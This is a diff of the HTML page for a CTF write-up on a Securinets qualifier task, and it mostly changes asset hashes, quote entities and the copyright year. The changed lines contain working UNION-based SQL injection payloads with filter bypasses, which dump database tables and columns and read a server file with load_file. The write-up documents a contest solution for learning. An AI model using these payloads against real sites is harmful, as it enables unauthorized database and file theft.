@@ -212,8 +212,8 @@
   
 
   <link rel="manifest" href="/index.webmanifest">
-  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
-  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png">
 
   <link rel="canonical" href="https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/">
 
@@ -280,7 +280,7 @@
     "name": "Ahmed Belkahla",
     "logo": {
       "@type": "ImageObject",
-      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png"
+      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"
     }
   },
   "description": "The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D"
@@ -644,7 +644,7 @@
 <p><img src="https://imgur.com/pXLjH4n.png" alt="TASK"></p>
 <p>This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let&rsquo;s start the exploitation of the famous SQL injection :D</p>
 <p><img src="https://imgur.com/B2IbSxr.png" alt="TASK"></p>
-<p>After the basic enumeration we can notice that these characters are filtered : <strong>[&quot; &ldquo;,&quot;-&rdquo;,&quot;,&quot;]</strong> so we will use the following bypasses:</p>
+<p>After the basic enumeration we can notice that these characters are filtered : <strong>[&quot; &ldquo;,&rdquo;-&quot;,&quot;,&quot;]</strong> so we will use the following bypasses:</p>
 <ol>
 <li>The white space : <strong>%0A</strong></li>
 <li>The &ldquo;-&rdquo; : we will use <strong>#</strong> to comment</li>
@@ -652,7 +652,7 @@
 </ol>
 <p>This step took me some time , after some tries i succeeded in equilibrating the query :</p>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p><img src="https://imgur.com/5VSI80e.png" alt="TASK"></p>
 <p>And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual</p>
@@ -660,7 +660,7 @@
 <li>Tables:</li>
 </ol>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p><strong>Table name</strong>: secrets</p>
 <p><img src="https://imgur.com/m190lNI.png" alt="TASK"></p>
@@ -668,16 +668,16 @@
 <li>Columns:</li>
 </ol>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&ldquo;secrets&rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&ldquo;secrets&rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p>The interesting <strong>Column name</strong> : value</p>
 <p><img src="https://imgur.com/TegJtmS.png" alt="TASK"></p>
 <p>And finally :</p>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p><img src="https://imgur.com/8ycD4ru.png" alt="TASK"></p>
-<p>Damn no flag for us :'( but no problem maybe if we just do load_file(&ldquo;flag.txt&rdquo;) we will have the flag ? unfortunately it wont work, in fact it&rsquo;s not that easy and this is the most juicy part of the task xd
+<p>Damn no flag for us :&rsquo;( but no problem maybe if we just do load_file(&ldquo;flag.txt&rdquo;) we will have the flag ? unfortunately it wont work, in fact it&rsquo;s not that easy and this is the most juicy part of the task xd
 i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D</p>
 <p><img src="https://imgur.com/TgUXftd.png" alt="TASK"></p>
 <blockquote>
@@ -685,12 +685,12 @@ i checked the privileges of the current user and the FILE permission was not gra
 </blockquote>
 <p>So probably the author have set a custom location in the global variable <strong>secure_file_priv</strong> , let&rsquo;s check its value in @@GLOBAL.secure_file_priv</p>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p><img src="https://imgur.com/Pdn180B.png" alt="TASK"></p>
 <p>BINGOOO ! so let&rsquo;s have our flag now :</p>
 <blockquote>
-<p>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&quot;/var/lib/mysql-files/flag/flag.txt&quot;))b%0Ajoin%0A(select%0A3)c)%0A%23</p>
+<p>?search=&rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&quot;/var/lib/mysql-files/flag/flag.txt&quot;))b%0Ajoin%0A(select%0A3)c)%0A%23</p>
 </blockquote>
 <p><strong>FLAG</strong> : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don&rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D</p>
 
@@ -816,7 +816,7 @@ i checked the privileges of the current user and the FILE permission was not gra
   <div class="media author-card content-widget-hr">
     
       
-      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_2.png" alt="Belkahla Ahmed">
+      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_3.png" alt="Belkahla Ahmed">
     
 
     <div class="media-body">
@@ -1014,7 +1014,7 @@ i checked the privileges of the current user and the FILE permission was not gra
     
     
     
-    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+    <script src="/js/academic.min.1f97b17be6d67ca715feaf9deb10e550.js"></script>
 
     
 
@@ -1030,7 +1030,7 @@ i checked the privileges of the current user and the FILE permission was not gra
   
 
   <p class="powered-by">
-    © Ahmed Belkahla, 2021 &middot; 
+    © Ahmed Belkahla, 2022 &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
